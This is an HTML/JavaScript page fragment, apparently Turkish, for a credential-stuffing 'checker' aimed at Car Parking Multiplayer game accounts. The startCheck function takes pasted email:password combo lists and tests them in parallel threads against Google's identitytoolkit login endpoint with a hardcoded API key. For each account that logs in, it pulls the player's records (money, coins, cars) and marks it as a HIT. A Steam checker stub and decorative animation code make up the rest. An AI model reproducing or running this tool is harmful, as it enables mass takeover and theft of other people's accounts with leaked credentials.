<body>

    <div class="wacked-box" id="main-box">

    <script>
        const audio = document.getElementById('bg-music');
        const volSlider = document.getElementById('volume-slider');
        const musicIcon = document.getElementById('music-icon');

        function toggleMusic() {
            if (!audio) return;
            if (audio.readyState === 0) audio.load();
            if (audio.paused) {
                audio.play().then(() => {
                    musicIcon.className = "fas fa-pause";
                }).catch(() => {});
            } else {
                audio.pause();
                musicIcon.className = "fas fa-music";
            }
        }

        if (volSlider) {
            volSlider.addEventListener('input', (e) => {
                if (audio) audio.volume = parseFloat(e.target.value);
            });
        }

        function showPanel(type) {
            const cp = document.getElementById('cp-panel');
            const steam = document.getElementById('steam-panel');
            const box = document.getElementById('main-box');

            if (type === 'steam') {
                cp.classList.add('hidden');
                steam.classList.remove('hidden');
                box.classList.add('steam-active');
            } else {
                steam.classList.add('hidden');
                cp.classList.remove('hidden');
                box.classList.remove('steam-active');
            }
            toggleSidebar();
        }

        function toggleSidebar() {
            document.getElementById('sidebar')?.classList.toggle('active');
        }

        async function runThreads(items, threadCount, workerFn) {
            const queue = [...items];
            const workers = [];
            for (let i = 0; i < Math.min(threadCount, items.length); i++) {
                workers.push((async () => {
                    while (queue.length > 0) {
                        const item = queue.shift();
                        if (item) await workerFn(item);
                    }
                })());
            }
            await Promise.all(workers);
        }

        // Car Parking check fonksiyonu (orijinal mantƒ±k korunarak temizlendi)
        async function startCheck() {
            const lines = document.getElementById('accounts').value
                .split('\n')
                .map(l => l.trim())
                .filter(l => l.includes(':'));
            
            const threadCount = Math.max(1, parseInt(document.getElementById('cp-threads').value) || 5);
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = "";

            let hit = 0, fail = 0;
            document.getElementById('cp-total').textContent = lines.length;
            document.getElementById('cp-hit').textContent = 0;
            document.getElementById('cp-fail').textContent = 0;
            document.getElementById('cp-status').textContent = "Tarama ba≈ülatƒ±ldƒ±...";

            await runThreads(lines, threadCount, async (line) => {
                const [email, password] = line.split(':').map(s => s.trim());
                try {
                    const loginRes = await fetch("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            email,
                            password,
                            returnSecureToken: true
                        })
                    });
                    const loginData = await loginRes.json();

                    if (loginData.idToken) {
                        const tkn = loginData.idToken;
                        const dataRes = await fetch("https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2", {
                            method: "POST",
                            headers: {
                                "authorization": `Bearer ${tkn}`,
                                "content-type": "application/json"
                            },
                            body: JSON.stringify({ data: "2893216D41959108CB8FA08951CB319B7AD80D02" })
                        });
                        const src = await dataRes.text();

                        const isim  = src.match(/Name\\":\\"(.*?)\\"/)?.[1]   || "Bilinmiyor";
                        const para  = src.match(/"money":(\d+)/)?.[1]         || "0";
                        const coin  = src.match(/"coin":(\d+)/)?.[1]           || "0";
                        const cars  = (src.match(/"carGeneratedIDs":\[(.*?)\]/)?.[1] || "").split(',').filter(Boolean).length;

                        hit++;
                        document.getElementById('cp-hit').textContent = hit;
                        resultsDiv.insertAdjacentHTML('afterbegin', 
                            `<div class="hit-line">‚úÖ <b>HIT:</b> ${email} <span style="color:#f1c40f;">[üë§ ${isim} | üí∞ ${para} | ü™ô ${coin} | üöó ${cars} Ara√ß]</span></div>`
                        );
                    } else {
                        fail++;
                        document.getElementById('cp-fail').textContent = fail;
                        resultsDiv.insertAdjacentHTML('afterbegin', `<div class="fail-line">‚ùå <b>FAIL:</b> ${email}</div>`);
                    }
                } catch {
                    fail++;
                    document.getElementById('cp-fail').textContent = fail;
                }
            });

            document.getElementById('cp-status').textContent = "ƒ∞≈ülem tamamlandƒ±.";
        }

        // Steam check kƒ±smƒ± backend'e baƒülƒ± olduƒüu i√ßin sadece frontend temizlendi
        async function startSteamCheck() {
            // ... orijinal mantƒ±ƒüƒ±nƒ±z burada devam eder (backend √ßaƒürƒ±sƒ± korunabilir)
            alert("Steam checker backend √ßaƒürƒ±sƒ± tetiklendi (kod temizlendi).");
        }

        // Arka plan partik√ºl animasyonu
        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d');
        let particles = [];

        function initParticles() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            particles = [];
            for (let i = 0; i < 150; i++) {
                particles.push({
                    x: Math.random() * canvas.width,
                    y: Math.random() * canvas.height,
                    size: Math.random() * 1.5 + 0.5,
                    speed: Math.random() * 0.8 + 0.3
                });
            }
        }

        function animateParticles() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "rgba(255, 255, 255, 0.5)";
            particles.forEach(p => {
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                ctx.fill();
                p.y += p.speed;
                if (p.y > canvas.height) p.y = -5;
            });
            requestAnimationFrame(animateParticles);
        }

        window.addEventListener('resize', initParticles);
        initParticles();
        animateParticles();
    </script>
